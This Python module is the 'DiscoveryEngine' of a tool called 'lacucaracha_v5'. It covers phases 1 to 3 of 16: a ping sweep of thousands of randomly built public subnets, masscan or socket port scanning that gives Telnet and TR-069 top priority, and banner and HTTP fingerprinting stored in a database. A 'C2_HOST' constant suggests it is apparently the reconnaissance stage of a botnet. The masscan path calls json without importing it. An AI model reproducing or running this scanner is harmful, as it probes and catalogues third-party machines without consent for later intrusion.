#!/usr/bin/env python3
"""
DiscoveryEngine — ICMP sweep, TCP masscan, service fingerprinting
- Phase: ICMP → TCP → FP (phase 1-3 of 16)
"""

import concurrent.futures
import logging
import os
import random
import re
import shutil
import socket
import subprocess
import time
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("lacucaracha_v5.discovery")

# ─── LOCAL COPY of SPIDER_SUBNETS ─────────────────────────
random.seed()
SPIDER_SUBNETS = []
for oct in range(0, 256):
    for base in ["159.89","159.223","167.71","137.184","143.110","157.230",
                  "138.68","165.22","128.199","178.128","188.166","206.189",
                  "46.101","159.65","104.248","49.12","65.21","95.217"]:
        SPIDER_SUBNETS.append(f"{base}.{oct}.0/24")
SPIDER_SUBNETS += [f"103.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(500)]
SPIDER_SUBNETS += [f"41.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"89.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"91.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"95.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"185.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"31.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"45.{random.randint(0,128)}.{random.randint(0,255)}.0/24" for _ in range(200)]

# ─── SERVICE MAPS ─────────────────────────────────────────
SERVICE_PRIORITY = {
    23:100, 7547:95, 80:85, 443:84, 8080:83, 8443:82,
    3000:80, 5000:79, 7000:78, 8888:77, 9092:76, 9200:75,
    9443:74, 9999:73, 3306:60, 5432:59, 27017:58, 6379:57,
    5900:40, 3389:39, 22:10, 2222:9, 445:50, 139:48, 135:45,
    1433:55, 1521:54, 4899:35, 161:30, 162:29,
}
SERVICE_NAME = {
    23:"Telnet", 22:"SSH", 2222:"SSH-ALT", 80:"HTTP", 443:"HTTPS", 8080:"HTTP-ALT",
    8443:"HTTPS-ALT", 3000:"Gitea/Node", 5000:"Flask/Django", 7000:"Spring/Java",
    8888:"Jupyter/Webmin", 3306:"MySQL", 5432:"PostgreSQL", 27017:"MongoDB",
    6379:"Redis", 7547:"TR-069", 5900:"VNC", 3389:"RDP", 9092:"Kafka",
    9200:"Elasticsearch", 9443:"HTTPS-ALT", 9999:"Monitoring",
    445:"SMB", 139:"NetBIOS", 1433:"MSSQL", 1521:"Oracle",
    4899:"RAdmin", 161:"SNMP", 162:"SNMP-Trap",
}
SERVICE_EMOJI = {
    23:"🔐", 22:"🔑", 2222:"🔑", 80:"🌐", 443:"🌐", 8080:"🌐", 8443:"🌐",
    3000:"🌐", 5000:"🌐", 7000:"🌐", 8888:"🌐", 3306:"🗄", 5432:"🗄", 27017:"🗄", 6379:"🗄",
    7547:"📡", 5900:"🖼", 3389:"🖥", 445:"🏢", 139:"🏢", 1433:"🗄", 1521:"🗄",
}

MASSCAN_PORTS = "23,22,2222,80,443,8080,8443,7547,3000,5000,7000,8888,9092,9200,9443,9999,3306,5432,27017,6379,5900,3389,161,162,445,139,135,1433,1521,4899"
MASSCAN_RATE = 5000
C2_HOST = "127.0.0.1"


class DiscoveryEngine:
    """ICMP sweep, TCP masscan, and service fingerprinting."""

    def __init__(self, reporter, db, pool=None):
        self.r = reporter
        self.db = db
        self.pool = pool or concurrent.futures.ThreadPoolExecutor(max_workers=30)

        # Locate masscan binary
        self._masscan_bin = shutil.which("masscan")
        if not self._masscan_bin:
            self._masscan_bin = shutil.which("masscan", path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
        if not self._masscan_bin:
            for p in ["/usr/bin/masscan", "/usr/local/bin/masscan",
                       "/opt/masscan/bin/masscan", "/root/go/bin/masscan"]:
                if os.path.isfile(p):
                    self._masscan_bin = p
                    break
        if self._masscan_bin:
            log.info(f"🔍 Masscan found: {self._masscan_bin}")
        else:
            log.warning("⚠️  Masscan not found — falling back to socket scan")

        self._subnet_index = 0
        self._icmp_cache: Dict[str, float] = {}
        self._used_subnets: set = set()

    # ─── SUBNET SELECTION ──────────────────────────────────
    def _get_random_subnet(self) -> str:
        if self._subnet_index >= len(SPIDER_SUBNETS):
            self._subnet_index = 0
            self._used_subnets.clear()
        subnet = SPIDER_SUBNETS[self._subnet_index]
        self._subnet_index += 1
        self._used_subnets.add(subnet)
        return subnet

    def _ip_from_subnet(self, subnet: str, host: int = None) -> str:
        """Generate an IP from a /24 CIDR notation."""
        base = subnet.split("/")[0]
        parts = base.split(".")
        if host is None:
            host = random.randint(1, 254)
        parts[-1] = str(host)
        return ".".join(parts)

    # ─── PHASE 1: ICMP SWEEP ───────────────────────────────
    def icmp_sweep(self, subnets: int = 3, hosts_per_subnet: int = 7) -> List[Dict]:
        """Ping sweep — returns list of {ip, ttl, rtt}."""
        results: List[Dict] = []
        targets: List[str] = []

        for _ in range(subnets):
            subnet = self._get_random_subnet()
            base = subnet.split("/")[0]
            parts = base.split(".")

            # Always ping .1 (gateway) and .254 (broadcast often responds)
            for h in [1, 254] + [random.randint(2, 253) for _ in range(hosts_per_subnet - 2)]:
                parts[-1] = str(h)
                targets.append(".".join(parts))

        def _ping(ip: str) -> Optional[Dict]:
            try:
                start = time.time()
                r = subprocess.run(
                    ["ping", "-c1", "-W2", ip],
                    capture_output=True, timeout=3, text=True
                )
                rtt = (time.time() - start) * 1000
                if r.returncode == 0:
                    ttl = 64
                    # Extract TTL from output
                    ttl_m = re.search(r'ttl[=:](\d+)', r.stdout, re.I)
                    if ttl_m:
                        ttl = int(ttl_m.group(1))
                    self._icmp_cache[ip] = time.time()
                    return {"ip": ip, "ttl": ttl, "rtt": round(rtt, 1)}
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
            for res in pool.map(_ping, targets):
                if res:
                    results.append(res)

        # Deduplicate by IP
        seen = set()
        deduped = []
        for r in results:
            if r["ip"] not in seen:
                seen.add(r["ip"])
                deduped.append(r)

        log.info(f"📡 ICMP sweep: {len(deduped)} alive from {len(targets)} targets")
        return deduped

    # ─── PHASE 2: TCP PORT SCAN ────────────────────────────
    def tcp_scan(self, subnets: int = 3) -> List[Dict]:
        """TCP port scan via masscan or socket fallback."""
        results: List[Dict] = []
        subnets_to_scan = [self._get_random_subnet() for _ in range(subnets)]

        if self._masscan_bin:
            results = self._masscan_scan(subnets_to_scan)
        else:
            results = self._socket_scan(subnets_to_scan)

        # Register in DB
        for r in results:
            try:
                self.db.add_target(r["ip"], r["port"], "tcp")
            except Exception as e:
                log.debug(f"DB add_target error: {e}")

        log.info(f"🔍 TCP scan: {len(results)} open ports from {len(subnets_to_scan)} subnets")
        return results

    def _masscan_scan(self, subnets: List[str]) -> List[Dict]:
        """Masscan-based TCP scanning."""
        results: List[Dict] = []
        subnet_str = " ".join(subnets)

        try:
            cmd = [
                self._masscan_bin,
                "-p", MASSCAN_PORTS,
                "--rate", str(MASSCAN_RATE),
                "--wait", "5",
                "--output-format", "json",
                "--output-filename", "-",
            ] + subnets

            start = time.time()
            r = subprocess.run(
                cmd, capture_output=True, timeout=120, text=True
            )
            elapsed = time.time() - start

            if r.returncode == 0 or r.stdout:
                for line in r.stdout.strip().split("\n"):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        data = json.loads(line)
                        ip = data.get("ip", "")
                        port = data.get("ports", [{}])[0].get("port", 0) if isinstance(data.get("ports"), list) and data["ports"] else data.get("port", 0)
                        if ip and port:
                            svc = SERVICE_NAME.get(int(port), f"p{port}")
                            results.append({
                                "ip": ip, "port": int(port),
                                "protocol": "tcp", "service_name": svc,
                            })
                    except (json.JSONDecodeError, IndexError):
                        continue
            else:
                log.warning(f"Masscan stderr: {r.stderr[:200]}")
                # Fall back to socket scan on error
                results = self._socket_scan(subnets)

        except subprocess.TimeoutExpired:
            log.warning("Masscan timed out, falling back to socket scan")
            results = self._socket_scan(subnets)
        except FileNotFoundError:
            log.warning("Masscan binary vanished, falling back to socket scan")
            results = self._socket_scan(subnets)
        except Exception as e:
            log.warning(f"Masscan error: {e}, falling back to socket scan")
            results = self._socket_scan(subnets)

        return results

    def _socket_scan(self, subnets: List[str]) -> List[Dict]:
        """Python socket-based TCP scanning (fallback when no masscan)."""
        results: List[Dict] = []
        ports = [int(p) for p in MASSCAN_PORTS.split(",") if p.strip()]
        scan_targets = []

        for subnet in subnets:
            base = subnet.split("/")[0]
            parts = base.split(".")
            # Scan first 10 hosts in each subnet
            for h in range(1, 11):
                parts[-1] = str(h)
                ip = ".".join(parts)
                for port in ports:
                    scan_targets.append((ip, port))

        def _check(ip: str, port: int) -> Optional[Dict]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((ip, port))
                s.close()
                if result == 0:
                    svc = SERVICE_NAME.get(port, f"p{port}")
                    return {"ip": ip, "port": port, "protocol": "tcp", "service_name": svc}
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as pool:
            fut_map = {pool.submit(_check, ip, port): (ip, port) for ip, port in scan_targets}
            for fut in concurrent.futures.as_completed(fut_map):
                res = fut.result()
                if res:
                    results.append(res)

        return results

    # ─── PHASE 3: FINGERPRINTING ───────────────────────────
    def fingerprint_all(self, targets: List[Dict]) -> int:
        """Banner grab, HTTP fingerprint, TTL detection."""
        count = 0

        def _fp(target: Dict) -> Optional[Dict]:
            ip = target.get("ip", "")
            port = int(target.get("port", 0))
            if not ip or not port:
                return None

            fp_info = {"os": "", "banner": "", "service": "",
                       "ttl": 0, "http_server": "", "icmp_alive": 0}

            # 1. TTL from ping
            try:
                r = subprocess.run(
                    ["ping", "-c1", "-W2", "-n", ip],
                    capture_output=True, timeout=3, text=True
                )
                if r.returncode == 0:
                    fp_info["icmp_alive"] = 1
                    ttl_m = re.search(r'ttl[=:](\d+)', r.stdout, re.I)
                    if ttl_m:
                        fp_info["ttl"] = int(ttl_m.group(1))
                        # OS detection from TTL
                        ttl = fp_info["ttl"]
                        if ttl <= 64:
                            fp_info["os"] = "Linux/Unix"
                        elif ttl <= 128:
                            fp_info["os"] = "Windows"
                        elif ttl <= 255:
                            fp_info["os"] = "Cisco/Network"
            except Exception:
                pass

            # 2. Banner grab via socket
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, port))

                # Send a probe based on service
                if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
                    s.sendall(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
                elif port == 22:
                    # SSH — just wait for banner
                    pass
                elif port == 23:
                    s.sendall(b"\r\n")
                elif port in (25, 587):
                    s.sendall(b"EHLO probe\r\n")
                elif port == 3306:
                    s.sendall(b"\x00")
                elif port == 6379:
                    s.sendall(b"PING\r\n")

                banner = b""
                try:
                    banner = s.recv(1024)
                except socket.timeout:
                    pass

                if banner:
                    # Clean up banner for storage
                    try:
                        decoded = banner.decode("utf-8", errors="replace")
                    except Exception:
                        decoded = repr(banner[:200])
                    fp_info["banner"] = decoded[:500].replace("\n", " ").replace("\r", "").strip()

                    # Service-specific info
                    if port in (22,) and "SSH" in decoded:
                        fp_info["service"] = "SSH"
                        m = re.search(r'SSH-\d+\.\d+-([^\s]+)', decoded)
                        if m:
                            fp_info["service"] = f"SSH-{m.group(1)}"
                    elif port in (80, 443, 8080, 8443) and decoded.startswith("HTTP"):
                        fp_info["service"] = "HTTP"
                        m = re.search(r'Server:\s*([^\r\n]+)', decoded, re.I)
                        if m:
                            fp_info["http_server"] = m.group(1).strip()
                    elif decoded.startswith("SSH"):
                        fp_info["service"] = "SSH"
                    elif "+OK" in decoded or decoded.startswith("220"):
                        fp_info["service"] = "SMTP"
                    elif decoded.startswith("Redis"):
                        fp_info["service"] = "Redis"
                    elif "MySQL" in decoded:
                        fp_info["service"] = "MySQL"

                s.close()
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass
            except Exception as e:
                log.debug(f"FP socket error {ip}:{port}: {e}")

            # 3. HTTP header grab for web ports
            if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
                try:
                    import urllib.request
                    import ssl as ssl_mod
                    ctx = ssl_mod.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl_mod.CERT_NONE
                    scheme = "https" if port in (443, 8443, 9443) else "http"
                    req = urllib.request.Request(f"{scheme}://{ip}:{port}/")
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                        server = resp.headers.get("Server", "")
                        if server:
                            fp_info["http_server"] = server
                        if not fp_info.get("banner"):
                            fp_info["banner"] = f"HTTP {resp.status} {resp.reason}"
                except Exception:
                    pass

            # 4. Store in DB
            try:
                self.db.mark_fp(ip, port, fp_info)
            except Exception as e:
                log.debug(f"DB mark_fp error: {e}")

            return {"ip": ip, "port": port, "fp": fp_info}

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
            for res in pool.map(_fp, targets):
                if res:
                    count += 1

        log.info(f"🖥  FP: {count}/{len(targets)} fingerprinted")
        return count
